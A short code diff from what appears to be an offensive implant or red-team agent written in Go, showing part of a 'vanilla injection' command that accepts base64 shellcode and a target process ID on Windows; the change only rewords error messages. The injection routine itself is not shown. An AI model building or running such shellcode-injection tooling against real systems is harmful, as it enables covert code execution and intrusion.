@@ -81,7 +81,7 @@ func (c *VanillaInjectionCommand) Description() string {
 func (c *VanillaInjectionCommand) Execute(task structs.Task) structs.CommandResult {
 	ensureInjectionAPIs()
 	if runtime.GOOS != "windows" {
-		return errorResult("Error: This command is only supported on Windows")
+		return errorResult("This command is only supported on Windows")
 	}
 
 	params, parseErr := unmarshalParams[VanillaInjectionParams](task)
@@ -90,16 +90,16 @@ func (c *VanillaInjectionCommand) Execute(task structs.Task) structs.CommandResu
 	}
 
 	if params.ShellcodeB64 == "" {
-		return errorResult("Error: No shellcode data provided")
+		return errorResult("No shellcode data provided")
 	}
 
 	shellcode, err := base64.StdEncoding.DecodeString(params.ShellcodeB64)
 	if err != nil {
-		return errorf("Error decoding shellcode: %v", err)
+		return errorf("decoding shellcode: %v", err)
 	}
 
 	if len(shellcode) == 0 {
-		return errorResult("Error: Shellcode data is empty")
+		return errorResult("Shellcode data is empty")
 	}
 
 	output := fmt.Sprintf("[*] Received shellcode: %d bytes\n", len(shellcode))
@@ -130,7 +130,7 @@ func (c *VanillaInjectionCommand) Execute(task structs.Task) structs.CommandResu
 	}
 
 	if params.PID <= 0 {
-		return errorResult("Error: Invalid PID specified (provide pid or target mode)")
+		return errorResult("Invalid PID specified (provide pid or target mode)")
 	}
 
 	output += fmt.Sprintf("[*] Target PID: %d\n", params.PID)
